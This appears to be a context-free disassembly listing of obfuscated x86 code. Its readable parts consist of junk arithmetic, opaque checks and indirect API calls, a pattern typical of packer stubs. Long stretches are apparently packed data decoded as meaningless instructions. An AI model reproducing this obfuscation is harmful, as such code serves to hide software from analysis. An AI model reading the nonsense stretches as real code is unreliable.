  40187b:	mov    edi,0x32de6d5d
  401880:	mov    ecx,DWORD PTR ds:0x428461
  401886:	sbb    DWORD PTR ds:0x42840d,ecx
  40188c:	mov    DWORD PTR [ebp-0x14],eax
  40188f:	cmp    DWORD PTR ds:0x428569,0x0
  401896:	not    ecx
  401898:	mov    DWORD PTR ds:0x428479,0x2a4e
  4018a2:	mov    edx,DWORD PTR ds:0x42854d
  4018a8:	jmp    0x401900
  4018ad:	mov    DWORD PTR ds:0x428339,0x4cb6
  4018b7:	mov    eax,0x4273
  4018bc:	cmp    DWORD PTR ds:0x428569,0x0
  4018c3:	jle    0x4018e8
  4018c9:	push   DWORD PTR [ebp-0x14]
  4018cc:	push   0x428165
  4018d1:	push   0x4281f1
  4018d6:	call   DWORD PTR ds:0x42e22c
  4018dc:	add    ecx,edx
  4018de:	or     DWORD PTR ds:0x428451,0x428471
  4018e8:	and    ecx,0x1796
  4018ee:	sub    edx,0x208e
  4018f4:	xor    DWORD PTR ds:0x428465,edx
  4018fa:	sub    DWORD PTR ds:0x42846d,ebx
  401900:	mov    eax,DWORD PTR [ebp+0x18]
  401903:	mov    ecx,DWORD PTR [ebp+0x1c]
  401906:	cmp    DWORD PTR ds:0x428419,0x0
  40190d:	movzx  edx,BYTE PTR ds:0x428415
  401914:	mov    edx,DWORD PTR ds:0x4284f1
  40191a:	movzx  edx,WORD PTR ds:0x428579
  401921:	jmp    0x401971
  401926:	mov    DWORD PTR ds:0x428565,0x405c
  401930:	cmp    DWORD PTR ds:0x428419,0x0
  401937:	jge    0x401961
  40193d:	push   DWORD PTR [ebp-0xc]
  401940:	push   DWORD PTR [ebp-0x14]
  401943:	push   0x1391
  401948:	push   0x7a4e
  40194d:	call   DWORD PTR ds:0x42e0a0
  401953:	neg    edx
  401955:	add    edx,0x51c2
  40195b:	sbb    edx,DWORD PTR ds:0x428365
  401961:	adc    DWORD PTR ds:0x428561,ecx
  401967:	sub    DWORD PTR ds:0x428365,0x3064
  401971:	shrd   eax,ecx,0x2
  401975:	shr    ecx,0x2
  401978:	cmp    DWORD PTR ds:0x428475,0x0
  40197f:	mov    ecx,DWORD PTR ds:0x42844d
  401985:	mov    ecx,0x3508
  40198a:	not    edx
  40198c:	jmp    0x4019d4
  401991:	mov    DWORD PTR ds:0x428555,edi
  401997:	mov    DWORD PTR ds:0x428439,0x1955
  4019a1:	cmp    DWORD PTR ds:0x428475,0x0
  4019a8:	je     0x4019cc
  4019ae:	push   0x428243
  4019b3:	push   0x400000
  4019b8:	call   DWORD PTR ds:0x42e0a4
  4019be:	neg    edx
  4019c0:	xor    DWORD PTR ds:0x428341,0x55e7
  4019ca:	sub    ecx,ecx
  4019cc:	not    ecx
  4019ce:	and    ecx,DWORD PTR ds:0x428441
  4019d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4019d7:	mov    edx,DWORD PTR [ebp+0x1c]
  4019da:	add    DWORD PTR ds:0x4284dd,0x428569
  4019e4:	xor    eax,edi
  4019e6:	xor    edx,edx
  4019e8:	or     edx,eax
  4019ea:	and    eax,0x837
  4019ef:	mov    DWORD PTR [ebp-0x3c],edx
  4019f2:	jmp    0x401d93
  4019f7:	inc    DWORD PTR [edx+0x3c]
  4019fa:	pop    ebx
  4019fb:	mov    esp,0xf09aa0bb
  401a00:	fisubr DWORD PTR [edx-0x386f51d]
  401a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a07:	mov    esi,0xbdbebecc
  401a0c:	les    edi,FWORD PTR [esi-0x4c77d842]
  401a12:	xchg   ebx,eax
  401a13:	popa   
  401a14:	imul   edi,DWORD PTR [ebx-0x57fa3798],0xd13d6bff
  401a1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a1f:	mov    bl,0x97
  401a21:	push   es
  401a22:	dec    esp
  401a23:	mov    esp,0xe4b39999
  401a28:	ins    BYTE PTR es:[edi],dx
  401a29:	adc    ebx,DWORD PTR [ebx]
  401a2b:	jnp    0x401a46
  401a2d:	sbb    BYTE PTR [edi+ebx*1+0x2a07949f],ah
  401a34:	fsubr  DWORD PTR [edi-0x51]
  401a37:	xor    ebx,DWORD PTR [ebp-0x5]
  401a3a:	shl    DWORD PTR [ecx+0x8191100],1
  401a40:	xchg   esi,eax
  401a41:	sti    
  401a42:	jbe    0x401a24
  401a44:	pushf  
  401a45:	mov    al,ds:0x9e9ce834
  401a4a:	add    DWORD PTR [eax-0x455b2b9e],esi
  401a50:	mov    bl,0x57
  401a52:	push   es
  401a53:	in     eax,dx
  401a54:	into   
  401a55:	fcom   st(1)
  401a57:	sub    DWORD PTR ds:0x621463bb,ebx
  401a5d:	out    dx,eax
  401a5e:	or     eax,0x8b0bc1d3
  401a63:	lods   al,BYTE PTR ds:[esi]
  401a64:	outs   dx,BYTE PTR ds:[esi]
  401a65:	or     BYTE PTR [edi-0x18],ah
  401a68:	push   esi
  401a69:	out    dx,al
  401a6a:	fdiv   st,st(4)
  401a6c:	mov    edi,0xf1685bf3
  401a71:	pop    ebx
  401a72:	adc    BYTE PTR [edx],al
  401a74:	lods   eax,DWORD PTR ds:[esi]
  401a75:	mul    BYTE PTR [ecx-0x59]
  401a78:	push   0xffffffdf
  401a7a:	pusha  
  401a7b:	jge    0x401a26
  401a7d:	push   cs
  401a7e:	or     ebx,DWORD PTR [ecx]
  401a80:	dec    esp
  401a81:	add    edx,ecx
  401a83:	mov    ebx,0x45fd828
  401a88:	call   0x2ab0:0x9585f3d8
  401a8f:	xlat   BYTE PTR ds:[ebx]
  401a90:	cmp    al,0xdd
  401a92:	and    BYTE PTR [edx],0x6a
  401a95:	push   edi
  401a96:	js     0x401b0e
  401a98:	iret   
  401a99:	lea    eax,[ecx-0x64]
  401a9c:	jno    0x401a81
  401a9e:	bound  edi,QWORD PTR [edx-0x39]
  401aa1:	or     edi,esi
  401aa3:	adc    bh,al
  401aa5:	aam    0xa0
  401aa7:	(bad)  cs:[ebp-0x39]
  401aab:	test   BYTE PTR [ebx-0x1a],dh
  401aae:	push   es
  401aaf:	imul   esi,DWORD PTR [eax+0x53d7c10],0xa943373b
  401ab9:	or     eax,0xd825772c
  401abe:	pop    eax
  401abf:	inc    esi
  401ac0:	fcom   QWORD PTR ds:0xc6cb1355
  401ac6:	sar    DWORD PTR [ecx-0x44],0xa
  401aca:	shl    BYTE PTR [edx-0x61],cl
  401acd:	vmwrite esi,DWORD PTR [edx-0x46589923]
  401ad4:	outs   dx,DWORD PTR ds:[esi]
  401ad5:	test   eax,0xefcac721
  401ada:	stc    
  401adb:	into   
  401adc:	fisttp WORD PTR [edi]
  401ade:	pop    es
  401adf:	mov    edi,0x92fcafc9
  401ae4:	and    ebp,edi
  401ae6:	pop    ds
  401ae7:	mov    eax,DWORD PTR [ebx-0x1d0aba36]
  401aed:	cmp    eax,0x4edd6079
  401af2:	inc    edx
  401af3:	mov    ds:0xc8e6b088,al
  401af8:	jle    0x401a9b
  401afa:	pop    es
  401afb:	loope  0x401af8
  401afd:	loop   0x401a97
  401aff:	and    esi,DWORD PTR [edx]
  401b01:	mov    ebp,0x5f70e1e1
  401b06:	pop    edi
  401b07:	mov    esp,0xae1a3fe1
  401b0c:	push   eax
  401b0d:	sub    al,0xa2
  401b0f:	xchg   esi,eax
  401b10:	sub    eax,0x38bbac20
  401b15:	and    edx,DWORD PTR [esi-0x7991ea87]
  401b1b:	push   esp
  401b1c:	sbb    BYTE PTR [edx+0x6299034a],bl
  401b22:	int    0x7f
  401b24:	xor    al,0x58
  401b26:	push   edi
  401b27:	cmp    cl,BYTE PTR ds:0xe42e74e
  401b2d:	into   
  401b2e:	mov    esp,DWORD PTR [ecx+ebx*4]
  401b31:	add    eax,0xeb41d59f
  401b36:	mov    ecx,0xc99651d6
  401b3b:	in     al,0xa9
  401b3d:	outs   dx,DWORD PTR ds:[esi]
  401b3e:	pop    ss
  401b3f:	call   0x2311:0xe21b294e
  401b46:	push   ss
  401b47:	shl    ah,1
  401b49:	lea    ebp,[esp+ebp*4-0x67]
  401b4d:	lea    eax,[ebx+0x6f]
  401b50:	ror    eax,0x9f
  401b53:	or     eax,0x65fa11b8
  401b58:	xor    ah,0xbe
  401b5b:	cs mov esi,0x7a8a6f6c
  401b61:	test   DWORD PTR [eax+0x68],edx
  401b64:	and    BYTE PTR [ecx+0x1d33255a],0x32
  401b6b:	push   es
  401b6c:	out    dx,al
  401b6d:	js     0x401b4b
  401b6f:	sar    DWORD PTR [edi],1
  401b71:	hlt    
  401b72:	inc    ebx
  401b73:	fild   DWORD PTR [ecx-0x42]
  401b76:	test   eax,0x42d5a577
  401b7b:	push   ebx
  401b7c:	dec    eax
  401b7d:	mov    esi,0x48ef087e
  401b82:	mov    esp,0x83f905fd
  401b87:	adc    BYTE PTR [edi-0x3c13c328],0xcd
  401b8e:	repnz xchg ecx,eax
  401b90:	and    BYTE PTR [ebx+edx*1],cl
  401b93:	cmp    eax,eax
  401b95:	stos   BYTE PTR es:[edi],al
  401b96:	scas   eax,DWORD PTR es:[edi]
  401b97:	xor    al,0x54
  401b99:	pop    esp
  401b9a:	in     eax,0x92
  401b9c:	and    eax,0x51cadd0b
  401ba1:	add    DWORD PTR [eax],0xc944c0a8
  401ba7:	mov    DWORD PTR [edi+0x58],ecx
  401baa:	pop    ebp
  401bab:	sahf   
  401bac:	inc    ebx
  401bad:	mov    cl,0xac
  401baf:	add    esp,DWORD PTR [ecx+eax*2]
  401bb2:	repz or eax,0x4416a303
  401bb8:	pop    ecx
  401bb9:	mov    ecx,eax
  401bbb:	lahf   
  401bbc:	push   0xa895b18e
  401bc1:	div    BYTE PTR [esi+esi*1+0x50b2319b]
  401bc8:	ds clc 
  401bca:	mov    ebp,0x2250f3f6
  401bcf:	hlt    
  401bd0:	js     0x401c48
  401bd2:	dec    ebx
  401bd3:	inc    edi
  401bd4:	dec    ebp
  401bd5:	pop    ecx
  401bd6:	scas   eax,DWORD PTR es:[edi]
  401bd7:	mov    esi,0x4166da48
  401bdc:	ffree  st(2)
  401bde:	int    0x5
  401be0:	shr    DWORD PTR [edi],0xf7
  401be3:	repnz pusha 
  401be5:	mov    edi,0x60e82cfb
  401bea:	mov    edi,0xfbc893ab
  401bef:	lods   al,BYTE PTR ds:[esi]
  401bf0:	xor    BYTE PTR [edi+edx*1-0x45c4daea],0xad
  401bf8:	sbb    BYTE PTR [ebp-0x1f],0x59
  401bfc:	pop    ecx
  401bfd:	xlat   BYTE PTR ds:[ebx]
  401bfe:	iret   
  401bff:	mov    edi,0x701309b
  401c04:	push   ds
  401c05:	dec    ecx
  401c06:	cdq    
  401c07:	or     DWORD PTR [ebx-0x51],ecx
  401c0a:	mov    al,ds:0x62a89b54
  401c0f:	shl    BYTE PTR [edx],cl
  401c11:	test   edi,eax
  401c13:	int    0x4f
  401c15:	fwait
  401c16:	add    bh,BYTE PTR [ecx+0x65]
  401c19:	inc    eax
  401c1a:	(bad)  
  401c1b:	imul   esi,DWORD PTR [ebx],0x9760f930
  401c21:	sahf   
  401c22:	in     eax,dx
  401c23:	nop
  401c24:	sahf   
  401c25:	sbb    edx,esi
  401c27:	push   ebp
  401c28:	loopne 0x401c48
  401c2a:	test   BYTE PTR [edx+0x3214365b],dh
  401c30:	jl     0x401c42
  401c32:	pushf  
  401c33:	test   BYTE PTR [ecx],bh
  401c35:	scas   al,BYTE PTR es:[edi]
  401c36:	aas    
  401c37:	neg    DWORD PTR [eax-0x2744a297]
  401c3d:	cmp    eax,DWORD PTR [esp+eiz*8-0x6fe1b6bd]
  401c44:	aaa    
  401c45:	mov    ch,0xad
  401c47:	stc    
  401c48:	and    eax,0x8143da8e
  401c4d:	xchg   esi,eax
  401c4e:	out    dx,eax
  401c4f:	mov    al,0xb6
  401c51:	xor    dl,ah
  401c53:	adc    eax,0x122643c2
  401c58:	pop    ds
  401c59:	inc    edi
  401c5a:	iret   
  401c5b:	fs pop ss
  401c5d:	xchg   ecx,eax
  401c5e:	dec    esp
  401c5f:	(bad)  
  401c61:	iret   
  401c62:	adc    al,dl
  401c64:	jg     0x401cbd
  401c66:	das    
  401c67:	sar    BYTE PTR [esi+edx*8],0x18
  401c6b:	ficomp DWORD PTR [edi-0x2c]
  401c6e:	je     0x401c0d
  401c70:	lock xor edx,DWORD PTR [edi-0x24ca8f6f]
  401c77:	sub    DWORD PTR [ebx+esi*1],edi
  401c7a:	mov    esi,0xcee5e61d
  401c7f:	xor    ebp,esi
  401c81:	jnp    0x401c2e
  401c83:	les    ecx,FWORD PTR [edi]
  401c85:	(bad)  
  401c87:	sub    eax,0xe94ba091
  401c8c:	aaa    
  401c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c8e:	pop    ebx
  401c8f:	mov    ds:0x2ea39c22,eax
  401c94:	(bad)  
  401c95:	popf   
  401c96:	fidivr DWORD PTR [eax]
  401c98:	pop    ds
  401c99:	stos   BYTE PTR es:[edi],al
  401c9a:	mov    esi,0xf91ac5c6
  401c9f:	adc    eax,DWORD PTR [ebp+0x613b59a6]
  401ca5:	out    0x49,eax
  401ca7:	adc    esp,DWORD PTR [edi+edx*2]
  401caa:	mov    edx,DWORD PTR [ecx+eax*8+0x77af9e53]
  401cb1:	retf   0x2d64
  401cb4:	out    dx,al
  401cb5:	mov    bh,0x10
  401cb7:	jae    0x401ce3
  401cb9:	mov    al,ds:0xb5be064a
  401cbe:	in     eax,0x86
  401cc0:	out    dx,al
  401cc1:	(bad)  
  401cc2:	push   ss
  401cc3:	inc    eax
  401cc4:	std    
  401cc5:	fnstenv [edx-0x1fe74b56]
  401ccb:	or     DWORD PTR [edx-0x74850b8b],ecx
  401cd1:	dec    BYTE PTR [edi]
  401cd3:	retf   0x5ad5
  401cd6:	out    0x3f,al
  401cd8:	sbb    DWORD PTR [edi-0x70],ebx
  401cdb:	pop    edi
  401cdc:	add    bx,WORD PTR es:[eax-0x35b9e8e4]
  401ce4:	adc    esi,ecx
  401ce6:	cmp    BYTE PTR [edx+0x66],bl
  401ce9:	retf   0x43fa
  401cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ced:	repnz or eax,0x4f28e123
  401cf3:	cmc    
  401cf4:	fld    DWORD PTR gs:[ecx+0x30f4fb69]
  401cfb:	iret   
  401cfc:	jg     0x401c84
  401cfe:	paddusw mm4,QWORD PTR [eax]
  401d01:	frstor [esi-0x1e0b9cde]
  401d07:	adc    DWORD PTR ds:[ebx+0x5284a859],ebx
  401d0e:	fcomp  QWORD PTR [edx+0x1f]
  401d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d12:	out    0x71,al
  401d14:	jl     0x401c99
  401d16:	pop    eax
  401d17:	mov    edi,0x6093cad0
  401d1c:	and    bh,BYTE PTR [esi]
  401d1e:	or     esp,DWORD PTR [eax]
  401d20:	and    ecx,DWORD PTR [ecx-0x3de87164]
  401d26:	sbb    edi,DWORD PTR [ecx-0x380aed55]
  401d2c:	jo     0xc173eb19
  401d32:	and    BYTE PTR [edx],dl
  401d34:	imul   edi,eax,0xdd5ea2d1
  401d3a:	mov    dl,0x1a
  401d3c:	sub    eax,0x694b595d
  401d41:	cmp    BYTE PTR [ecx],ch
  401d43:	outs   dx,DWORD PTR ds:[esi]
  401d44:	jmp    0x5fc6:0xdfc1459f
  401d4b:	ror    DWORD PTR [eax-0x6c],1
  401d4e:	xlat   BYTE PTR ds:[ebx]
  401d4f:	push   ebx
  401d50:	repz mov ebx,0x9f21c3d1
  401d56:	xor    DWORD PTR [ebx-0x585c67e3],ebx
  401d5c:	push   0xfffffff1
  401d5e:	(bad)  
  401d5f:	shl    BYTE PTR ds:0xcddbe314,0xf
  401d66:	imul   DWORD PTR [edx+0x33]
  401d69:	daa    
  401d6a:	jmp    0x33b2:0x993c53fc
  401d71:	mov    BYTE PTR [ecx+0x66],bl
  401d74:	or     eax,0x5a5adc0f
  401d79:	shl    BYTE PTR [ecx+edi*4+0x6f],0xf6
  401d7e:	adc    eax,0xa9e43030
  401d83:	popf   
  401d84:	jge    0x401d35
  401d86:	rcl    BYTE PTR [edx-0x40],0x34
  401d8a:	dec    edi
  401d8b:	inc    eax
  401d8c:	popf   
  401d8d:	fs push ecx
  401d8f:	adc    dl,BYTE PTR [eax]
  401d91:	mov    ebp,0x9045c7a4
  401d96:	push   ebp
  401d97:	sub    al,0x0
  401d99:	add    bh,al
  401d9b:	inc    ebp
  401d9c:	xchg   esp,eax
  401d9d:	outs   dx,DWORD PTR ds:[esi]
  401d9e:	inc    ebp
  401d9f:	add    BYTE PTR [eax],al
  401da1:	mov    DWORD PTR [ebp-0x70],0x78a6
  401da8:	mov    DWORD PTR [ebp-0x6c],0x188
  401daf:	sbb    DWORD PTR ds:0x428425,ecx
  401db5:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401dbc:	mov    DWORD PTR [ebp-0x6c],0x3219
  401dc3:	add    DWORD PTR ds:0x42855d,0x3158
  401dcd:	mov    DWORD PTR [ebp-0x70],0x231c
  401dd4:	add    eax,DWORD PTR ds:0x42840d
  401dda:	mov    DWORD PTR [ebp-0x6c],0x1337
  401de1:	sub    DWORD PTR ds:0x428371,edx
  401de7:	mov    DWORD PTR [ebp-0x70],0x7593
  401dee:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401df5:	movzx  eax,BYTE PTR ds:0x42834d
  401dfc:	and    DWORD PTR ds:0x428575,eax
  401e02:	mov    DWORD PTR [ebp-0x70],0x3b72
  401e09:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401e10:	cmp    DWORD PTR ds:0x428415,0x0
  401e17:	mov    DWORD PTR ds:0x42854d,0x646
  401e21:	mov    DWORD PTR ds:0x428425,0x14a3
  401e2b:	jmp    0x401eb8
  401e30:	movzx  eax,WORD PTR ds:0x4284f1
  401e37:	mov    DWORD PTR ds:0x428415,ebx
  401e3d:	cmp    DWORD PTR ds:0x428415,0x0
  401e44:	jle    0x401e86
  401e4a:	push   DWORD PTR [ebp-0x20]
  401e4d:	push   0x428243
  401e52:	push   0x428147
  401e57:	push   0x400000
  401e5c:	call   DWORD PTR ds:0x42e230
  401e62:	xor    DWORD PTR ds:0x42854d,0x4536
  401e6c:	sub    DWORD PTR ds:0x4284d5,edi
  401e72:	sbb    DWORD PTR ds:0x42843d,0x42854d
  401e7c:	add    DWORD PTR ds:0x428465,0x5ddd
  401e86:	sbb    DWORD PTR ds:0x428575,0x428425
  401e90:	adc    DWORD PTR ds:0x428569,0x5ea9
  401e9a:	sub    DWORD PTR ds:0x428559,0x428545
  401ea4:	add    DWORD PTR ds:0x428345,0x5dac
  401eae:	add    DWORD PTR ds:0x42833d,0x46fc
  401eb8:	mov    DWORD PTR [ebp-0x68],0x1b45
  401ebf:	xor    DWORD PTR ds:0x428431,edx
  401ec5:	mov    DWORD PTR [ebp-0x64],0x767d
  401ecc:	or     DWORD PTR ds:0x42854d,edi
  401ed2:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401ed9:	mov    DWORD PTR [ebp-0x5c],0x0
  401ee0:	mov    DWORD PTR [ebp-0x34],0x599d
  401ee7:	xor    eax,DWORD PTR ds:0x4284c5
  401eed:	mov    DWORD PTR [ebp-0x2c],0x165d
  401ef4:	mov    DWORD PTR [ebp-0x1c],0xc51
  401efb:	xor    eax,eax
  401efd:	add    eax,DWORD PTR ds:0x428359
  401f03:	or     eax,DWORD PTR ds:0x428435
  401f09:	mov    ds:0x428359,eax
  401f0e:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f15:	cmp    DWORD PTR ds:0x42855d,0x0
  401f1c:	mov    DWORD PTR ds:0x428335,0xd43
  401f26:	mov    DWORD PTR ds:0x428579,0x5a6d
  401f30:	mov    DWORD PTR ds:0x42841d,edx
  401f36:	jmp    0x40200c
  401f3b:	mov    eax,0x36f8
  401f40:	mov    DWORD PTR ds:0x428475,edx
  401f46:	cmp    DWORD PTR ds:0x42855d,0x0
  401f4d:	jg     0x401f82
  401f53:	push   0x4521
  401f58:	push   0x4861
  401f5d:	push   DWORD PTR [ebp-0x20]
  401f60:	push   0x428238
  401f65:	push   DWORD PTR [ebp-0x28]
  401f68:	call   DWORD PTR ds:0x42e0a8
  401f6e:	adc    DWORD PTR ds:0x428445,0x7cd6
  401f78:	sbb    DWORD PTR ds:0x4284f1,0xfa0
  401f82:	adc    DWORD PTR ds:0x428451,0x42833d
  401f8c:	add    DWORD PTR ds:0x428359,0x428471
  401f96:	cmp    DWORD PTR ds:0x42854d,0x0
  401f9d:	mov    DWORD PTR ds:0x428475,0x6252
  401fa7:	mov    DWORD PTR ds:0x428371,0x40d0
  401fb1:	jmp    0x40200c
  401fb6:	mov    DWORD PTR ds:0x428555,edx
  401fbc:	cmp    DWORD PTR ds:0x42854d,0x0
  401fc3:	ja     0x401fee
  401fc9:	push   0x428165
  401fce:	call   DWORD PTR ds:0x42e234
  401fd4:	and    DWORD PTR ds:0x42835d,0x4284f9
  401fde:	sbb    DWORD PTR ds:0x428439,0x5068
  401fe8:	xor    DWORD PTR ds:0x4284f1,edi
  401fee:	and    DWORD PTR ds:0x4284e1,0x42857d
  401ff8:	xor    DWORD PTR ds:0x4284f9,0x428575
  402002:	add    DWORD PTR ds:0x428545,0xd3c
  40200c:	mov    DWORD PTR [ebp-0x44],0x1
  402013:	mov    DWORD PTR [ebp-0x44],0x42e8
  40201a:	mov    eax,DWORD PTR [ebp-0x60]
  40201d:	add    DWORD PTR ds:0x428355,0x4284cd
  402027:	shl    ecx,0x1e
  40202a:	mov    ecx,DWORD PTR [ebp-0x5c]
  40202d:	add    DWORD PTR ds:0x4284d5,0x5f4
  402037:	push   ecx
  402038:	adc    DWORD PTR ds:0x4284fd,0x428349
  402042:	push   eax
  402043:	or     DWORD PTR ds:0x428501,0x4284dd
  40204d:	push   0xddf
  402052:	sbb    DWORD PTR ds:0x428361,0x218d
  40205c:	jmp    0x4023fd
  402061:	mov    ebp,0x2b7a2504
  402066:	jl     0x401ffa
  402068:	mov    esp,0x9e22191a
  40206d:	lods   al,BYTE PTR ds:[esi]
  40206e:	jmp    0x402084
  402070:	sahf   
  402071:	mov    ebp,0xbdbebed2
  402076:	les    edi,FWORD PTR [esi+0xe3e9fbe]
  40207c:	mov    edi,DWORD PTR [ebp-0x6b]
  40207f:	ret    0xd981
  402082:	test   BYTE PTR [esi+edx*2],0xf
  402086:	clc    
  402087:	cmp    edi,edx
  402089:	clc    
  40208a:	stos   BYTE PTR es:[edi],al
  40208b:	lock loop 0x402070
  40208e:	add    bl,BYTE PTR [edx-0x70ba8dbc]
  402094:	jl     0x40208d
  402096:	add    ecx,ebp
  402098:	repnz add edx,DWORD PTR fs:[eax+0x6b05287c]
  4020a0:	(bad)  
  4020a1:	std    
  4020a2:	shr    BYTE PTR [ecx-0x648a4f37],1
  4020a8:	out    0xf6,al
  4020aa:	adc    BYTE PTR [ebx],bh
  4020ac:	cdq    
  4020ad:	scas   eax,DWORD PTR es:[edi]
  4020ae:	retf   0x590f
  4020b1:	addr16 out 0xd8,al
  4020b4:	std    
  4020b5:	scas   al,BYTE PTR es:[edi]
  4020b6:	mov    ah,0xf9
  4020b8:	sbb    DWORD PTR [esi+0x76],esi
  4020bb:	pop    ds
  4020bc:	dec    edx
  4020bd:	inc    eax
  4020be:	lahf   
  4020bf:	adc    ecx,edi
  4020c1:	inc    esp
  4020c2:	mov    ch,0xec
  4020c4:	inc    edx
  4020c5:	xchg   edi,eax
  4020c6:	push   0x203535d
  4020cb:	adc    edi,DWORD PTR [esi+ebx*1+0x5988a106]
  4020d2:	dec    ebx
  4020d3:	int3   
  4020d4:	aad    0x9d
  4020d6:	sbb    al,0x1d
  4020d8:	cdq    
  4020d9:	pop    esi
  4020da:	push   eax
  4020db:	push   ecx
  4020dc:	jmp    0x402095
  4020de:	dec    ebx
  4020df:	outs   dx,DWORD PTR ds:[esi]
  4020e0:	(bad)  
  4020e1:	xchg   ebx,eax
  4020e2:	mov    dl,0x1d
  4020e4:	sahf   
  4020e5:	mov    ebp,0xd4d9f7d
  4020ea:	jb     0x402163
  4020ec:	in     eax,0x79
  4020ee:	ret    
  4020ef:	sub    DWORD PTR [ebp+0x38],eax
  4020f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020f3:	fdiv   st,st(3)
  4020f5:	enter  0x5b33,0x84
  4020f9:	add    eax,0xc1842c11
  4020fe:	push   edi
  4020ff:	mov    ah,0xfe
  402101:	sti    
  402102:	inc    ebp
  402103:	call   0xf4938c07
  402108:	test   bl,bh
  40210a:	dec    ecx
  40210b:	test   ebx,eax
  40210d:	push   0xffffff99
  40210f:	push   ebx
  402110:	push   ebx
  402111:	jns    0x402190
  402113:	add    esp,DWORD PTR [edx]
  402115:	dec    edi
  402116:	jb     0x40215b
  402118:	cmp    BYTE PTR [edx+edx*1+0x11],ah
  40211c:	add    eax,0x6d2a10
  402121:	xlat   BYTE PTR ds:[ebx]
  402122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402123:	sbb    ecx,eax
  402125:	test   BYTE PTR [ebx-0x1b810c86],cl
  40212b:	in     al,dx
  40212c:	jb     0x402196
  40212e:	into   
  40212f:	int    0x6c
  402131:	and    ebp,DWORD PTR [ecx+0x6a75d760]
  402137:	(bad)  
  402138:	pop    eax
  402139:	fmul   DWORD PTR [eax+edi*4-0x43ac158]
  402140:	push   edi
  402141:	push   ecx
  402142:	fimul  DWORD PTR [esp+ebx*8-0x6ae99cf6]
  402149:	sbb    bh,BYTE PTR [ebp+0x661c3f52]
  40214f:	mov    ebp,0x4211f16f
  402154:	cdq    
  402155:	jne    0x4020ec
  402157:	out    0x7b,al
  402159:	push   ebx
  40215a:	lea    esp,[esi]
  40215c:	(bad)  
  40215d:	xor    al,0x8a
  40215f:	pop    edx
  402160:	sbb    BYTE PTR [ebx+0x73e5d8dc],bl
  402166:	adc    ah,BYTE PTR [ebx]
  402168:	sub    al,0xed
  40216a:	fbstp  TBYTE PTR [ecx-0x43]
  40216d:	jle    0x402101
  40216f:	sub    dh,ah
  402171:	jmp    0x40214c
  402173:	jbe    0x402183
  402175:	outs   dx,BYTE PTR ds:[esi]
  402176:	fsubr  DWORD PTR [ebx-0x2cf11f52]
  40217c:	retf   
  40217d:	loopne 0x402115
  40217f:	leave  
  402180:	mov    BYTE PTR [edx-0x2e],ah
  402183:	pusha  
  402184:	ins    BYTE PTR es:[edi],dx
  402185:	test   eax,0x221fdbd
  40218a:	cmp    DWORD PTR [eax-0x50],edi
  40218d:	mov    esi,0x382be161
  402192:	xor    cl,dl
  402194:	add    eax,0x6cf4420b
  402199:	inc    ecx
  40219a:	out    dx,al
  40219b:	and    ecx,edi
  40219d:	sbb    DWORD PTR [edx-0x45],edx
  4021a0:	mov    esp,0x2a5db8f5
  4021a5:	out    dx,al
  4021a6:	and    al,0xc8
  4021a8:	or     bl,BYTE PTR [edi]
  4021aa:	jmp    0x783d:0xc389429
  4021b1:	jo     0x40220f
  4021b3:	fnstcw WORD PTR [esi]
  4021b5:	shr    ebp,cl
  4021b7:	mov    dl,0xfc
  4021b9:	pop    edi
  4021ba:	sbb    esp,ecx
  4021bc:	repz push 0x547cadf5
  4021c2:	fsub   QWORD PTR [eax+0xb]
  4021c5:	sbb    bl,BYTE PTR [esp+ebx*2-0x2199e72d]
  4021cc:	int3   
  4021cd:	ret    0xe4c9
  4021d0:	jg     0x4021f2
  4021d2:	pop    es
  4021d3:	or     ebx,DWORD PTR [ebx-0x7]
  4021d6:	push   ecx
  4021d7:	jmp    0x153c:0xd65414a3
  4021de:	(bad)  
  4021df:	push   ebp
  4021e0:	adc    dh,BYTE PTR [edi-0x2c69ea1e]
  4021e6:	enter  0xac64,0xc2
  4021ea:	jle    0x4021c5
  4021ec:	ret    0xc311
  4021ef:	xchg   ecx,eax
  4021f0:	push   ss
  4021f1:	add    al,0xab
  4021f3:	xchg   BYTE PTR [ebx-0x58372081],bh
  4021f9:	push   ebx
  4021fa:	daa    
  4021fb:	jns    0x4021f5
  4021fd:	je     0x4021c6
  4021ff:	out    0x2b,eax
  402201:	mov    dh,0x25
  402203:	dec    esi
  402204:	push   0xfc5bfd80
  402209:	cmp    ch,al
  40220b:	fimul  WORD PTR [ebx+0x59]
  40220e:	mov    BYTE PTR [edi],ch
  402210:	cs das 
  402212:	or     edi,ebp
  402214:	xor    al,0xa5
  402216:	(bad)  [esi-0x6d3d30e5]
  40221c:	jnp    0x402247
  40221e:	add    dh,BYTE PTR [edx+0x218f297]
  402224:	sub    eax,0x9770d8d2
  402229:	inc    eax
  40222a:	or     BYTE PTR [edi],ah
  40222c:	ins    BYTE PTR es:[edi],dx
  40222d:	int    0x7e
  40222f:	inc    ebx
  402230:	rcr    DWORD PTR [ecx-0x31],1
  402233:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402236:	arpl   di,ax
  402238:	fiadd  WORD PTR [ecx]
  40223a:	sub    al,0x18
  40223c:	add    DWORD PTR [esi+ebx*2-0xaa743c2],ebx
  402243:	mov    DWORD PTR [eax+0x3],eax
  402246:	mov    ecx,0x7c1eb868
  40224b:	cmp    ah,bl
  40224d:	or     esp,edx
  40224f:	add    esi,esi
  402251:	adc    BYTE PTR [esi-0x68c29967],ah
  402257:	(bad)  
  402259:	push   es
  40225a:	push   edx
  40225b:	js     0x402231
  40225d:	mov    ebp,DWORD PTR [esi]
  40225f:	fistp  WORD PTR [edi-0x5a451ce9]
  402265:	call   0x4a54:0x39568511
  40226c:	cmp    BYTE PTR [eax+0x20],al
  40226f:	or     DWORD PTR [ebx+ecx*1-0x263dc784],0x2096323
  40227a:	and    al,0x16
  40227c:	cmp    esp,DWORD PTR [ecx+esi*8+0x24]
  402280:	(bad)  
